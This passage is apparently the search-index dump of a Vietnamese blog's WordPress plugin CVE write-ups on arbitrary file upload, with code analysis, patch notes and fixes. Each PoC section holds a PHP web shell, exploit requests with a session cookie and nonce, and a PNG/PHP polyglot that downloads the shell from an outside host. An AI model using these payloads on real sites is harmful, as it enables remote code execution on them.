th·ª±c thi ƒë∆∞·ª£c (Kh√¥ng ch·∫•p nh·∫≠n php). ","date":"2025-11-06","objectID":"/vi/posts/2025-11-06-cve-2025-10647/:3:1","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10647 Analysis \u0026 POC","uri":"/vi/posts/2025-11-06-cve-2025-10647/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code\rH√†m ajax_handler_download_pdf_media(): Check nonce ch·ªëng CSRF check_ajax_referer( 'epdf_wf_download_pdf_media' ); Khi t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a epdf_wf_download_pdf_media trong th∆∞ m·ª•c ch·ª©a m√£ ngu·ªìn c·ªßa plugin Nonce ƒë∆∞·ª£c t·∫°o v·ªõi key `_ajax_nonce`\rNonce ƒë∆∞·ª£c t·∫°o c√≥ key l√† _ajax_nonce ƒë∆∞·ª£c l∆∞u tr·ªØ b·ªüi Object epdf_wf_pdf_viewer_strings =\u003e c√≥ th·ªÉ l·∫•y gi√° tr·ªã c·ªßa _ajax_nonce trong console c·ªßa tr√¨nh duy·ªát b·∫±ng c√°ch g·ªçi epdf_wf_pdf_viewer_strings.nonce L·∫•y nonce t·ª´ console tr√¨nh duy·ªát\rNonce n√†y ƒë∆∞·ª£c t·∫°o sau khi truy c·∫≠p trang ƒë∆∞·ª£c t·∫°o b·∫±ng WPForms s·ª≠ d·ª•ng PDF Viewer T·∫°o form b·∫±ng WPForms s·ª≠ d·ª•ng PDF Viewer\rForm ƒë∆∞·ª£c t·∫°o s·∫Ω embed v√†o Post/Page c·ªßa WordPress Ki·ªÉm tra d·ªØ li·ªáu g·ª≠i l√™n if ( empty( $_POST['url'] ) ) { wp_send_json_error(); } N·∫øu request kh√¥ng c√≥ url, h√†m s·∫Ω tr·∫£ v·ªÅ JSON l·ªói v√† d·ª´ng th·ª±c thi. L·∫•y v√† l√†m s·∫°ch URL $url = esc_url_raw( wp_unslash( $_POST['url'] ) ); wp_unslash() lo·∫°i b·ªè slash escape (WordPress t·ª± th√™m escape khi g·ª≠i POST). esc_url_raw() l√†m s·∫°ch URL ƒë·ªÉ ƒë·∫£m b·∫£o an to√†n tr∆∞·ªõc khi d√πng ƒë·ªÉ t·∫£i file. T·∫£i file v·ªÅ server (temporary) $tmp_file = download_url( $url ); download_url() t·∫£i file t·ª´ URL v·ªÅ file t·∫°m th·ªùi tr√™n server. Tr·∫£ v·ªÅ ƒë∆∞·ªùng d·∫´n t·ªõi file t·∫°m n·∫øu th√†nh c√¥ng, ho·∫∑c WP_Error n·∫øu th·∫•t b·∫°i. if ( is_wp_error( $tmp_file ) ) { wp_send_json_error( array( 'msg' =\u003e sprintf( __( 'The download failed with error \"%s\"', 'embed-pdf-wpforms' ), $tmp_file-\u003eget_error_message() ), ) ); } N·∫øu download th·∫•t b·∫°i ‚Üí tr·∫£ v·ªÅ JSON l·ªói k√®m th√¥ng b√°o l·ªói. X√°c ƒë·ªãnh th∆∞ m·ª•c upload v√† t√™n file $upload_dir = wp_upload_dir(); $file_name = wp_unique_filename( $upload_dir['path'], basename( $url ) ); $path = $upload_dir['path'] . DIRECTORY_SEPARATOR . $file_name; wp_upload_dir() tr·∫£ v·ªÅ m·∫£ng th√¥ng tin th∆∞ m·ª•c uploads: path, URL, subdir, ‚Ä¶ wp_unique_filename() ƒë·∫£m b·∫£o t√™n file kh√¥ng tr√πng v·ªõi c√°c file ƒë√£ c√≥. $path l√† ƒë∆∞·ªùng d·∫´n ƒë·∫ßy ƒë·ªß n∆°i file s·∫Ω ƒë∆∞·ª£c l∆∞u. $upload_dir['path'] th∆∞·ªùng c√≥ d·∫°ng l√† wp-content/uploads/year/month Kh·ªüi t·∫°o h·ªá th·ªëng Filesystem c·ªßa WordPress global $wp_filesystem; if ( ! class_exists( 'WP_Filesystem' ) ) { require_once ABSPATH . '/wp-admin/includes/file.php'; } WP_Filesystem(); Di chuy·ªÉn file t·∫°m sang th∆∞ m·ª•c uploads $wp_filesystem-\u003emove( $tmp_file, $path ); Di chuy·ªÉn file t·ª´ temp ($tmp_file) sang uploads ($path). S·ª≠ d·ª•ng $wp_filesystem-\u003emove() thay v√¨ rename() ƒë·ªÉ t∆∞∆°ng th√≠ch m·ªçi m√¥i tr∆∞·ªùng (Direct, FTP, ‚Ä¶). ajax_handler_download_pdf_media() ƒë∆∞·ª£c dƒÉng k√Ω l√†m callback cho action hook add_action( 'wp_ajax_epdf_wf_download_pdf_media', array( $this, 'ajax_handler_download_pdf_media' ) ); ƒêi·ªÅu n√†y c√≥ nghƒ©a l√†: wp_ajax_ y√™u c·∫ßu ng∆∞·ªùi d√πng ƒë√£ ƒëƒÉng nh·∫≠p(t·ªëi thi·∫øu l√† Subcriber) m·ªõi ƒë∆∞·ª£c g·ª≠i request ƒë∆∞∆°c ch·∫•p nh·∫≠n epdf_wf_download_pdf_media l√† action ƒë∆∞·ª£c truy·ªÅn trong param Khi ng∆∞·ªùi d√πng ƒë√£ ƒëƒÉng nh·∫≠p g·ª≠i request ƒë·∫øn endpoint /wp-admin/admin-ajax.php v·ªõi param action=epdf_wf_download_pdf_media th√¨ ajax_handler_download_pdf_media() ƒë∆∞·ª£c g·ªçi ƒë·ªÉ x·ª≠ l√Ω request ","date":"2025-11-06","objectID":"/vi/posts/2025-11-06-cve-2025-10647/:3:2","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10647 Analysis \u0026 POC","uri":"/vi/posts/2025-11-06-cve-2025-10647/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rgraph TD\rA[\"Subcriber POST -\u003e /wp-admin/admin-ajax.php?action=epdf_wf_download_pdf_media\u0026url=...\"] --\u003e B[\"ajax_handler_download_pdf_media()\"]\rB --\u003e C[\"check_ajax_referer('epdf_wf_download_pdf_media')\"]\rC --\u003e D[\"download_url($url) -\u003e $tmp_file (temporary file)\"]\rD --\u003e E{\"is_wp_error($tmp_file) ?\"}\rE -- \"yes\" --\u003e F[\"wp_send_json_error() -\u003e STOP\"]\rE -- \"no\" --\u003e K[\"Uploaded file accessible ‚Üí potential RCE\"]\rgraph TD\rA[\"Subcriber POST -\u003e /wp-admin/admin-ajax.php?action=epdf_wf_download_pdf_media\u0026url=...\"] --\u003e B[\"ajax_handler_download_pdf_media()\"]\rB --\u003e C[\"check_ajax_referer('epdf_wf_download_pdf_media')\"]\rC --\u003e D[\"download_url($url) -\u003e $tmp_file (temporary file)\"]\rD --\u003e E{\"is_wp_error($tmp_file) ?\"}\rE -- \"yes\" --\u003e F[\"wp_send_json_error() -\u003e STOP\"]\rE -- \"no\" --\u003e K[\"Uploaded file accessible ‚Üí potential RCE\"]\rgraph TD\rA[\"Subcriber POST -\u003e /wp-admin/admin-ajax.php?action=epdf_wf_download_pdf_media\u0026url=...\"] --\u003e B[\"ajax_handler_download_pdf_media()\"]\rB --\u003e C[\"check_ajax_referer('epdf_wf_download_pdf_media')\"]\rC --\u003e D[\"download_url($url) -\u003e $tmp_file (temporary file)\"]\rD --\u003e E{\"is_wp_error($tmp_file) ?\"}\rE -- \"yes\" --\u003e F[\"wp_send_json_error() -\u003e STOP\"]\rE -- \"no\" --\u003e K[\"Uploaded file accessible ‚Üí potential RCE\"]\rgraph TD\rA[\"Subcriber POST -\u003e /wp-admin/admin-ajax.php?action=epdf_wf_download_pdf_media\u0026url=...\"] --\u003e B[\"ajax_handler_download_pdf_media()\"]\rB --\u003e C[\"check_ajax_referer('epdf_wf_download_pdf_media')\"]\rC --\u003e D[\"download_url($url) -\u003e $tmp_file (temporary file)\"]\rD --\u003e E{\"is_wp_error($tmp_file) ?\"}\rE -- \"yes\" --\u003e F[\"wp_send_json_error() -\u003e STOP\"]\rE -- \"no\" --\u003e K[\"Uploaded file accessible ‚Üí potential RCE\"]\r","date":"2025-11-06","objectID":"/vi/posts/2025-11-06-cve-2025-10647/:3:3","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10647 Analysis \u0026 POC","uri":"/vi/posts/2025-11-06-cve-2025-10647/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-11-06","objectID":"/vi/posts/2025-11-06-cve-2025-10647/:4:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10647 Analysis \u0026 POC","uri":"/vi/posts/2025-11-06-cve-2025-10647/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rTruy c·∫≠p trang ch·ª©a form ƒë∆∞·ª£c t·∫°o t·ª´ WPForms s·ª≠ d·ª•ng PDF Viewer L·∫•y nonce T·∫°o file .php ch·ª©a code RCE v√† l∆∞u tr·ªØ tr√™n internet \u003c?php system($_REQUEST[\"cmd\"]) ?\u003e G·ª≠i POST request v·ªõi url tr·ªè ƒë·∫øn file v·ª´a t·∫°o. POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost Cookie: wordpress_86a9106ae65537651a8e456835b316ab=sub%7C1762165151%7C5VGNGPhUPc74oSqabIRMtpA8jrLrn2JYdg6Lc4fqU8I%7C69db0f51f219492ec3f150bb86bc1364f7cd33442587ddf3f1bf334e4cdec409; wp-settings-time-2=1761725656; wp-settings-4=libraryContent%3Dbrowse%26uploader%3D1%26mfold%3Do; wp-settings-time-4=1761637043; wp-settings-2=editor%3Dtinymce%26libraryContent%3Dbrowse; wp-settings-time-3=1761711790; wp-settings-3=libraryContent%3Dbrowse; _lscache_vary=fff4fa950d2b9daa95c3289bb2a7040a; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=sub%7C1762165151%7C5VGNGPhUPc74oSqabIRMtpA8jrLrn2JYdg6Lc4fqU8I%7Ca7cb9996e74be71e18c68f339c0ad07a43687c7eb701f89fe90374cc2a783131; wp-settings-time-5=1761992371 ... _ajax_nonce=ea2ccf0ccd\u0026action=epdf_wf_download_pdf_media\u0026url=https://github.com/w41bu1/w41test/raw/refs/heads/main/rce.php Truy c·∫≠p file v·ª´a t·∫°o v√† RCE RCE v·ªõi file upload\r","date":"2025-11-06","objectID":"/vi/posts/2025-11-06-cve-2025-10647/:4:1","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10647 Analysis \u0026 POC","uri":"/vi/posts/2025-11-06-cve-2025-10647/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rL·ªó h·ªïng cho ph√©p arbitrary file upload trong ajax_handler_download_pdf_media() l√† do thi·∫øu ki·ªÉm tra quy·ªÅn v√† ki·ªÉu file khi t·∫£i file t·ª´ URL, d·∫´n ƒë·∫øn kh·∫£ nƒÉng k·∫ª t·∫•n c√¥ng c√≥ t√†i kho·∫£n Subscriber t·∫£i l√™n file th·ª±c thi (v√≠ d·ª• .php) v√† g√¢y RCE. Nh√† ph√°t tri·ªÉn ƒë√£ kh·∫Øc ph·ª•c b·∫±ng c√°ch ki·ªÉm tra current_user_can('upload_files') v√† x√°c th·ª±c MIME v·ªõi wp_check_filetype() trong phi√™n b·∫£n 1.1.6. ƒê·ªëi v·ªõi site b·ªã ·∫£nh h∆∞·ªüng, c·∫ßn c·∫≠p nh·∫≠t l√™n 1.1.6 ngay, ki·ªÉm tra v√† xo√° c√°c file kh·∫£ nghi trong th∆∞ m·ª•c uploads, r√† so√°t quy·ªÅn ng∆∞·ªùi d√πng v√† nh·∫≠t k√Ω ƒë·ªÉ ph√°t hi·ªán d·∫•u hi·ªáu khai th√°c. ","date":"2025-11-06","objectID":"/vi/posts/2025-11-06-cve-2025-10647/:5:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10647 Analysis \u0026 POC","uri":"/vi/posts/2025-11-06-cve-2025-10647/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaway\rLu√¥n ki·ªÉm tra quy·ªÅn ng∆∞·ªùi d√πng (current_user_can) tr∆∞·ªõc khi th·ª±c hi·ªán upload qua AJAX. Lu√¥n x√°c th·ª±c ki·ªÉu/MIME c·ªßa file (wp_check_filetype / whitelist) tr∆∞·ªõc khi l∆∞u. C·∫≠p nh·∫≠t plugin nhanh ch√≥ng khi c√≥ b·∫£n v√°; r√† so√°t file upload v√† log sau khi ph√°t hi·ªán l·ªói. √Åp d·ª•ng nguy√™n t·∫Øc √≠t quy·ªÅn nh·∫•t (least privilege) v√† gi√°m s√°t h√†nh vi b·∫•t th∆∞·ªùng trong media/uploads. ","date":"2025-11-06","objectID":"/vi/posts/2025-11-06-cve-2025-10647/:6:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10647 Analysis \u0026 POC","uri":"/vi/posts/2025-11-06-cve-2025-10647/#key-takeaway"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rArbitrary File Upload WordPress Embed PDF for WPForms Plugin \u003c= 1.1.5 is vulnerable to Arbitrary File Upload ","date":"2025-11-06","objectID":"/vi/posts/2025-11-06-cve-2025-10647/:7:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10647 Analysis \u0026 POC","uri":"/vi/posts/2025-11-06-cve-2025-10647/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Podlove Podcast Publisher Plugin.","date":"2025-11-05","objectID":"/vi/posts/2025-11-05-cve-2025-10147/","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10147 Analysis \u0026 POC","uri":"/vi/posts/2025-11-05-cve-2025-10147/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rPlugin Podlove Podcast Publisher cho WordPress c√≥ l·ªó h·ªïng cho ph√©p arbitrary file uploads do thi·∫øu ki·ªÉm tra lo·∫°i t·ªáp trong h√†m 'move_as_original_file' ·ªü t·∫•t c·∫£ c√°c phi√™n b·∫£n t·ªõi v√† bao g·ªìm 4.2.6. ƒêi·ªÅu n√†y cho ph√©p unauthenticated attackers t·∫£i l√™n c√°c t·ªáp t√πy √Ω l√™n m√°y ch·ªß c·ªßa site b·ªã ·∫£nh h∆∞·ªüng, ƒëi·ªÅu c√≥ th·ªÉ d·∫´n t·ªõi remote code execution. CVE ID: CVE-2025-10147 Vulnerability Type: Arbitrary File Upload Affected Versions: \u003c= 4.2.6 Patched Versions: 4.2.7 CVSS severity: High (10) Required Privilege: Unauthenticated Product: WordPress Podlove Podcast Publisher Plugin ","date":"2025-11-05","objectID":"/vi/posts/2025-11-05-cve-2025-10147/:1:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10147 Analysis \u0026 POC","uri":"/vi/posts/2025-11-05-cve-2025-10147/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Podlove Podcast Publisher: 4.2.6 (vulnerable) v√† 4.2.7 (patched). Diff tool - Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n. ","date":"2025-11-05","objectID":"/vi/posts/2025-11-05-cve-2025-10147/:2:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10147 Analysis \u0026 POC","uri":"/vi/posts/2025-11-05-cve-2025-10147/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r","date":"2025-11-05","objectID":"/vi/posts/2025-11-05-cve-2025-10147/:3:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10147 Analysis \u0026 POC","uri":"/vi/posts/2025-11-05-cve-2025-10147/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code\rTheo m√¥ t·∫£ c·ªßa CVE th√¨ v·ªã tr√≠ l·ªói n·∫±m ·ªü h√†m move_as_original_file() public function move_as_original_file($file) { $move_new_file = @rename($file, $this-\u003eoriginal_file()); if (false === $move_new_file) { Log::get()-\u003eaddWarning( sprintf( __('Podlove Image Cache: The downloaded image could not be moved to %s.'), $this-\u003eoriginal_file() ) ); } } H√†m move_as_original_file($file) Th·ª±c hi·ªán di chuy·ªÉn file t·∫°m $file (v·ª´a ƒë∆∞·ª£c t·∫£i v·ªÅ t·ª´ URL) ‚Üí sang ƒë∆∞·ªùng d·∫´n c·ªë ƒë·ªãnh tr·∫£ v·ªÅ b·ªüi $this-\u003eoriginal_file(). rename() trong PHP = move file (chuy·ªÉn v·ªã tr√≠ file, kh√¥ng copy). D·∫•u @ d√πng ƒë·ªÉ ·∫©n l·ªói PHP n·∫øu thao t√°c th·∫•t b·∫°i. N·∫øu rename() tr·∫£ v·ªÅ false, plugin ghi c·∫£nh b√°o v√†o log. public function original_file() { return implode(DIRECTORY_SEPARATOR, [ $this-\u003eupload_basedir, $this-\u003efile_name('original') ]); } ‚Üí T·∫°o ƒë∆∞·ªùng d·∫´n tuy·ªát ƒë·ªëi tr√™n server, v√≠ d·ª•: /var/www/html/wp-content/cache/podlove/6e/7262f37a8018efafa4764ea97a4c26/original.png $this-\u003eupload_basedir (t·ª´ __construct()) Class Image { public function __construct($url, $file_name = '') { // FIXME: if $file_name is empty, the url will not work. I must not treat this silently! $this-\u003esource_url = trim($url ?? ''); $this-\u003efile_name = sanitize_title($file_name); // manually remove troublemaking characters // @see https://community.podlove.org/t/solved-kind-of-cover-art-disappears-caching-issue/478/ // @see https://sendegate.de/t/problem-mit-caching-von-grafiken/2947 if (function_exists('iconv')) { $this-\u003efile_name = iconv('UTF-8', 'ASCII//TRANSLIT', $this-\u003efile_name); } $this-\u003efile_name = preg_replace('~[^-a-z0-9_]+~', '', $this-\u003efile_name); $this-\u003efile_extension = $this-\u003eextract_file_extension(); $this-\u003eid = md5($url.$this-\u003efile_name); // create subdirectories to avoid too many directories in the root directory $id_directory = substr($this-\u003eid, 0, 2).'/'.substr($this-\u003eid, 2); $this-\u003eupload_basedir = self::cache_dir().$id_directory; $this-\u003eupload_baseurl = content_url('cache/podlove/').$id_directory; } } ƒê∆∞·ª£c t·∫°o d·ª±a tr√™n cache_dir() v√† hash MD5 c·ªßa URL, ‚Üí n·∫±m trong th∆∞ m·ª•c: wp-content/cache/podlove/\u003c2 k√Ω t·ª± ƒë·∫ßu\u003e/\u003cph·∫ßn c√≤n l·∫°i\u003e/ M·∫πo ·ªû ƒë√¢y ta c√≥ th·ªÉ ch·ªâ truy·ªÅn m·ªói $url, v√≠ d·ª•: $url=\"https://example.com/filename.php\" th√¨ $this-\u003eid=\"b1555a128239e3f59ccfb8d17e5b6c5a\" $this-\u003eupload_basedir=\"http://localhost/wp-content/cache/podlove/b1/555a128239e3f59ccfb8d17e5b6c5a\" Ta c√≥ th·ªÉ ki·ªÉm so√°t ƒë∆∞·ª£c ƒë∆∞·ªùng d·∫´n c·ªßa file ƒë∆∞·ª£c t·∫°o.\rmove_as_original_file() ƒë∆∞·ª£c g·ªçi trong h√†m download_source() public function download_source() { $source_url = $this-\u003esource_url; ... $source_domain = wp_parse_url($source_url, PHP_URL_HOST); $current_domain = explode(':', $_SERVER['HTTP_HOST'])[0]; // if domains match, see if the image is part of the Publisher // and can be copied on the filesystem, skipping http if ($current_domain == $source_domain) { ... return; } // for download_url() require_once ABSPATH.'wp-admin/includes/file.php'; $result = self::download_url($this-\u003esource_url); ... list($temp_file, $response) = $result; if (!\\Podlove\\is_image($temp_file)) { ... wp_delete_file($temp_file); return; } $this-\u003ecreate_basedir(); $this-\u003esave_cache_data($response); $this-\u003emove_as_original_file($temp_file); wp_delete_file($temp_file); $this-\u003eadd_donotbackup_dotfile(); } H√†m n√†y t·∫£i ·∫£nh t·ª´ URL ng∆∞·ªùi d√πng cung c·∫•p, ki·ªÉm tra h·ª£p l·ªá, r·ªìi l∆∞u c·ªë ƒë·ªãnh v√†o th∆∞ m·ª•c cache c·ªßa plugin. C·ª• th·ªÉ: $source_url l·∫•y URL h√¨nh ·∫£nh do ng∆∞·ªùi d√πng cung c·∫•p. H√†m t√°ch domain t·ª´ $source_url v√† domain hi·ªán t·∫°i c·ªßa site ($_SERVER['HTTP_HOST']). N·∫øu hai domain tr√πng nhau ‚Üí ·∫£nh n·∫±m trong c√πng site th·ª±c hi·ªán logic v√† tr·∫£ v·ªÅ. N·∫øu kh√°c domain ‚Üí d√πng download_url() ƒë·ªÉ t·∫£i file t·∫°m v·ªÅ m√°y ch·ªß. public static function download_url($url, $timeout = 300, $extra_args = []) { ... $tmpfname = wp_tempnam($url); if (!$tmpfname) { return new \\WP_Error('http_no_file', __('Could not create Temporary file.')); } $default_args = [ 'timeout' =\u003e $timeout, 'stream' =\u003e true, 'filename' =\u003e $tmpfname, 'sslverify' =\u003e \\Podlove\\get_setting('website', 'ssl_verify_peer') == 'on', ","date":"2025-11-05","objectID":"/vi/posts/2025-11-05-cve-2025-10147/:3:1","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10147 Analysis \u0026 POC","uri":"/vi/posts/2025-11-05-cve-2025-10147/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rgraph TD\rA[\"Request with params (podlove_image_cache_url)\"] --\u003e B[\"podlove_handle_cache_files()\"]\rB --\u003e C[\"hex2str() ‚Üí $source_url ‚Üí new Image(...)\"]\rC --\u003e D[\"download_source() ‚Üí download_url() ‚Üí temporary file\"]\rD --\u003e E[\"is_image() check\"]\rE -- pass --\u003e F[\"move_as_original_file() ‚Üí save to wp-content/cache/podlove/first_2_characters/remaining_characters/\"]\rF --\u003e G[\"File accessible ‚Üí possible RCE\"]\rE -- fail --\u003e H[\"Delete temp file ‚Üí stop\"]\rgraph TD\rA[\"Request with params (podlove_image_cache_url)\"] --\u003e B[\"podlove_handle_cache_files()\"]\rB --\u003e C[\"hex2str() ‚Üí $source_url ‚Üí new Image(...)\"]\rC --\u003e D[\"download_source() ‚Üí download_url() ‚Üí temporary file\"]\rD --\u003e E[\"is_image() check\"]\rE -- pass --\u003e F[\"move_as_original_file() ‚Üí save to wp-content/cache/podlove/first_2_characters/remaining_characters/\"]\rF --\u003e G[\"File accessible ‚Üí possible RCE\"]\rE -- fail --\u003e H[\"Delete temp file ‚Üí stop\"]\rgraph TD\rA[\"Request with params (podlove_image_cache_url)\"] --\u003e B[\"podlove_handle_cache_files()\"]\rB --\u003e C[\"hex2str() ‚Üí $source_url ‚Üí new Image(...)\"]\rC --\u003e D[\"download_source() ‚Üí download_url() ‚Üí temporary file\"]\rD --\u003e E[\"is_image() check\"]\rE -- pass --\u003e F[\"move_as_original_file() ‚Üí save to wp-content/cache/podlove/first_2_characters/remaining_characters/\"]\rF --\u003e G[\"File accessible ‚Üí possible RCE\"]\rE -- fail --\u003e H[\"Delete temp file ‚Üí stop\"]\rgraph TD\rA[\"Request with params (podlove_image_cache_url)\"] --\u003e B[\"podlove_handle_cache_files()\"]\rB --\u003e C[\"hex2str() ‚Üí $source_url ‚Üí new Image(...)\"]\rC --\u003e D[\"download_source() ‚Üí download_url() ‚Üí temporary file\"]\rD --\u003e E[\"is_image() check\"]\rE -- pass --\u003e F[\"move_as_original_file() ‚Üí save to wp-content/cache/podlove/first_2_characters/remaining_characters/\"]\rF --\u003e G[\"File accessible ‚Üí possible RCE\"]\rE -- fail --\u003e H[\"Delete temp file ‚Üí stop\"]\r","date":"2025-11-05","objectID":"/vi/posts/2025-11-05-cve-2025-10147/:3:2","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10147 Analysis \u0026 POC","uri":"/vi/posts/2025-11-05-cve-2025-10147/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-11-05","objectID":"/vi/posts/2025-11-05-cve-2025-10147/:4:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10147 Analysis \u0026 POC","uri":"/vi/posts/2025-11-05-cve-2025-10147/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rTh√™m \u003cphp\u003e tag v√†o file ·∫£nh v√† ƒë·ªïi extension th√†nh .php echo '\u003c?php system($_REQUEST[\"cmd\"]); ?\u003e' \u003e\u003e rce.png mv rce.png rce.php ‚ùØ cat rce.php ÔøΩPNG ‚ê¶ IHDÔøΩÔøΩUdÔøΩtEXtSoftwaregnome-screenshotÔøΩÔøΩ\u003e-tEXtCreation TimeSat 01 Nov 2025 02:58:29 PM +075ÔøΩÔøΩÔøΩÔøΩIDATHÔøΩÔøΩÔøΩA ÔøΩ ÔøΩÔøΩGHIÔøΩÔøΩlÔøΩÔøΩlÔøΩÀÖÔøΩÔøΩKÔøΩnÔøΩD ÔøΩH)ÔøΩÔøΩÔøΩa:koo‹≤\u003c`ÔøΩuÔøΩoÔøΩ ÔøΩ{ÔøΩ3ÔøΩ9ÔøΩ1ÔøΩ~ÔøΩÔøΩ ÔøΩ9ÔøΩÔøΩÔøΩÔøΩPÔøΩ1ÔøΩÔøΩÔøΩÔøΩRÔøΩ!D\u003eLkÔøΩÔøΩÔøΩFTÔøΩrÔøΩ|ÔøΩRuÔøΩÔøΩ uÔøΩÔøΩo'ÔøΩ`ÔøΩÔøΩ?ÔøΩ!\"ÔøΩÔøΩ 2kÔøΩÔøΩÔøΩIENDÔøΩB`ÔøΩ\u003c?php system($_REQUEST[\"cmd\"]); ?\u003e L∆∞u file ·ªü ƒë√¢u ƒë√≥ tr√™n internet, domain kh√¥ng tr√πng v·ªõi wordpress domain website, v√≠ d·ª•: https://github.com/w41bu1/w41test/raw/refs/heads/main/rce.php M√£ h√≥a hex(https://github.com/w41bu1/w41test/raw/refs/heads/main/rce.php) ‚ùØ echo -n \"https://github.com/w41bu1/w41test/raw/refs/heads/main/rce.php\" | xxd -p 68747470733a2f2f6769746875622e636f6d2f7734316275312f773431746573742f7261772f726566732f68656164732f6d61696e2f7263652e706870 G·ª≠i GET request v·ªõi param podlove_image_cache_url=68747470733a2f2f6769746875622e636f6d2f7734316275312f773431746573742f7261772f726566732f68656164732f6d61696e2f7263652e706870 Upload file th√†nh c√¥ng\rTruy c·∫≠p file v·ª´a t·∫°o v√† RCE RCE v·ªõi file upload\rTh√¥ng tin\r02/9acf743e6beb9c8e4395ee694d6504 nh∆∞ ph√¢n t√≠ch tr∆∞·ªõc ƒë√≥, n√≥ l√† md5($url), sau ƒë√≥ t·∫°o c·∫•u tr√∫c th∆∞ m·ª•c first_2_characters/remaining_characters d·ª±a tr√™n k·∫øt qu·∫£ c·ªßa md5() ","date":"2025-11-05","objectID":"/vi/posts/2025-11-05-cve-2025-10147/:4:1","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10147 Analysis \u0026 POC","uri":"/vi/posts/2025-11-05-cve-2025-10147/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rL·ªó h·ªïng trong Podlove Podcast Publisher ‚â§ 4.2.6 cho ph√©p t·∫£i l√™n file t√πy √Ω do thi·∫øu ki·ªÉm tra ƒë·ªãnh d·∫°ng trong move_as_original_file(). K·∫ª t·∫•n c√¥ng c√≥ th·ªÉ t·∫£i file ƒë·ªôc h·∫°i (v√≠ d·ª• .php) l√™n th∆∞ m·ª•c: wp-content/cache/podlove/\u003cfirst2\u003e/\u003crest\u003e/, t·ª´ ƒë√≥ d·∫´n ƒë·∫øn Remote Code Execution (RCE) n·∫øu file ƒë∆∞·ª£c truy c·∫≠p c√¥ng khai. ","date":"2025-11-05","objectID":"/vi/posts/2025-11-05-cve-2025-10147/:5:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10147 Analysis \u0026 POC","uri":"/vi/posts/2025-11-05-cve-2025-10147/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaway\rNguy√™n nh√¢n: ki·ªÉm tra MIME y·∫øu, kh√¥ng ch·∫∑n ph·∫ßn m·ªü r·ªông nguy hi·ªÉm. B·∫£n v√° (‚â• 4.2.7): th√™m x√°c th·ª±c b·∫±ng wp_check_filetype_and_ext() v√† danh s√°ch denylist. C√°ch kh·∫Øc ph·ª•c: c·∫≠p nh·∫≠t plugin, ch·∫∑n th·ª±c thi PHP trong th∆∞ m·ª•c cache, x√≥a file l·∫°. ","date":"2025-11-05","objectID":"/vi/posts/2025-11-05-cve-2025-10147/:6:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10147 Analysis \u0026 POC","uri":"/vi/posts/2025-11-05-cve-2025-10147/#key-takeaway"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rArbitrary File Upload WordPress Podlove Podcast Publisher Plugin \u003c= 4.2.6 is vulnerable to Arbitrary File Upload ","date":"2025-11-05","objectID":"/vi/posts/2025-11-05-cve-2025-10147/:7:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10147 Analysis \u0026 POC","uri":"/vi/posts/2025-11-05-cve-2025-10147/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress RTMKit Plugin.","date":"2025-11-04","objectID":"/vi/posts/2025-11-04-cve-2025-62065/","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-62065 Analysis \u0026 POC","uri":"/vi/posts/2025-11-04-cve-2025-62065/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rCVE ID: CVE-2025-62065 Vulnerability Type: Arbitrary File Upload Affected Versions: \u003c= 1.6.5 Patched Versions: 1.6.6 CVSS severity: Medium (9.9) Required Privilege: Contributor Product: WordPress RTMKit Plugin ","date":"2025-11-04","objectID":"/vi/posts/2025-11-04-cve-2025-62065/:1:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-62065 Analysis \u0026 